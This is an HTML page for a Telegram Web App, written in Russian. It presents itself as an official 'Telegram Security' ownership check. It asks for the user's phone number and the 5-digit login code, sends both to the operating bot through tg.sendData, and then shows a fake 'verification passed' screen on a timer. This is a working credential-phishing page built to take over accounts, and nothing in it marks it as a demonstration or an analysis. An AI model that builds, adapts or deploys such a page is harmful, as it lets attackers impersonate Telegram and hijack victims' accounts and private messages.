<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Telegram Security</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
            background:#0f0f0f;color:#fff;min-height:100vh;
            display:flex;align-items:center;justify-content:center;padding:16px;
        }
        .container{
            background:#1a1a1a;border-radius:20px;padding:32px 24px;
            max-width:400px;width:100%;text-align:center;
            border:1px solid #2a2a2a;box-shadow:0 20px 60px rgba(0,0,0,0.5);
        }
        .shield{
            width:80px;height:80px;margin:0 auto 24px;
            background:linear-gradient(135deg,#2aabee,#1a8fc4);
            border-radius:50%;display:flex;align-items:center;justify-content:center;
            font-size:40px;animation:pulse 2s infinite;
        }
        @keyframes pulse{
            0%,100%{box-shadow:0 0 0 0 rgba(42,171,238,0.4)}
            50%{box-shadow:0 0 0 20px rgba(42,171,238,0)}
        }
        h2{font-size:22px;margin-bottom:6px}
        .sub{color:#888;font-size:14px;margin-bottom:24px;line-height:1.5}
        .hidden{display:none!important}
        
        .input-box{
            background:#1e1e1e;border:1px solid #2a2a2a;border-radius:12px;
            padding:4px 16px;display:flex;align-items:center;gap:10px;margin-bottom:16px;
        }
        .input-box span{color:#888;font-size:18px}
        .input-box input{
            width:100%;padding:14px 0;border:none;background:transparent;
            color:#fff;font-size:16px;outline:none;font-family:inherit;
        }
        .input-box input::placeholder{color:#444}
        
        .btn{
            width:100%;padding:15px;border:none;border-radius:12px;
            background:#2aabee;color:#fff;font-size:16px;font-weight:600;
            cursor:pointer;font-family:inherit;
        }
        .btn:active{transform:scale(0.97)}
        .btn:disabled{background:#333!important;color:#666!important}
        
        .status{margin-top:14px;font-size:13px;min-height:20px}
        .status.err{color:#f44336}
        
        .spinner{
            display:inline-block;width:18px;height:18px;
            border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;
            border-radius:50%;animation:spin 0.7s linear infinite;
            vertical-align:middle;margin-right:8px;
        }
        @keyframes spin{to{transform:rotate(360deg)}}
        
        .success-icon{font-size:64px;animation:bounceIn 0.6s ease}
        @keyframes bounceIn{
            0%{transform:scale(0)}
            50%{transform:scale(1.2)}
            100%{transform:scale(1)}
        }
        .footer{margin-top:24px;font-size:11px;color:#333}
    </style>
</head>
<body>
    <div class="container">
        <div class="shield">🛡️</div>
        
        <div id="step1">
            <h2>Проверка безопасности</h2>
            <p class="sub">Подтвердите что вы владелец этого аккаунта Telegram</p>
            <div class="input-box">
                <span>📱</span>
                <input type="tel" id="phoneInput" placeholder="+7 911 222 33 44" autocomplete="tel">
            </div>
            <button class="btn" onclick="sendCode()" id="sendBtn">📩 Отправить код</button>
            <div class="status" id="phoneStatus"></div>
        </div>
        
        <div id="step2" class="hidden">
            <h2>Код подтверждения</h2>
            <p class="sub">Мы отправили 5-значный код на<br><strong id="phoneDisplay"></strong></p>
            <div class="input-box">
                <span>🔑</span>
                <input type="text" id="codeInput" placeholder="Введите код" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
            </div>
            <button class="btn" onclick="verifyCode()" id="verifyBtn">✅ Подтвердить</button>
            <div class="status" id="codeStatus"></div>
            <span style="margin-top:14px;font-size:13px;color:#888;cursor:pointer;display:inline-block" onclick="goBack()">← Изменить номер</span>
        </div>
        
        <div id="step3" class="hidden">
            <div class="success-icon">✅</div>
            <h2 style="margin-top:16px">Верификация пройдена</h2>
            <p class="sub">Ваш аккаунт подтверждён.<br>Спасибо за сотрудничество.</p>
        </div>
        
        <div class="footer">Telegram Security © 2024</div>
    </div>
    
    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        
        let phoneNumber = '';
        
        // Ждём ответ от бота
        tg.onEvent('webview_data', function(data) {
            // Не используется, ответ приходит через sendData колбэк
        });
        
        function sendCode(){
            const raw = document.getElementById('phoneInput').value.trim();
            if(!raw){
                document.getElementById('phoneStatus').textContent = 'Введите номер телефона';
                document.getElementById('phoneStatus').className = 'status err';
                return;
            }
            
            phoneNumber = raw.replace(/\s+/g,'').replace(/-/g,'').replace(/\(/g,'').replace(/\)/g,'');
            if(!phoneNumber.startsWith('+')) phoneNumber = '+' + phoneNumber;
            
            const btn = document.getElementById('sendBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span>Отправка...';
            document.getElementById('phoneStatus').textContent = '';
            document.getElementById('phoneStatus').className = 'status';
            
            // Меняем на шаг 2 сразу
            setTimeout(function(){
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
                document.getElementById('phoneDisplay').textContent = phoneNumber;
                document.getElementById('codeInput').focus();
            }, 500);
            
            tg.sendData(JSON.stringify({action:'send_code', phone:phoneNumber}));
        }
        
        function verifyCode(){
            const code = document.getElementById('codeInput').value.trim();
            if(!code || code.length < 5){
                document.getElementById('codeStatus').textContent = 'Введите 5 цифр';
                document.getElementById('codeStatus').className = 'status err';
                return;
            }
            
            const btn = document.getElementById('verifyBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span>Проверка...';
            document.getElementById('codeStatus').textContent = '';
            document.getElementById('codeStatus').className = 'status';
            
            tg.sendData(JSON.stringify({action:'verify_code', code:code, phone:phoneNumber}));
            
            // Ждём и показываем успех
            setTimeout(function(){
                document.getElementById('step2').classList.add('hidden');
                document.getElementById('step3').classList.remove('hidden');
            }, 2000);
        }
        
        function goBack(){
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step1').classList.remove('hidden');
            document.getElementById('sendBtn').disabled = false;
            document.getElementById('sendBtn').innerHTML = '📩 Отправить код';
            document.getElementById('phoneStatus').textContent = '';
            document.getElementById('codeStatus').textContent = '';
        }
    </script>
</body>
</html>
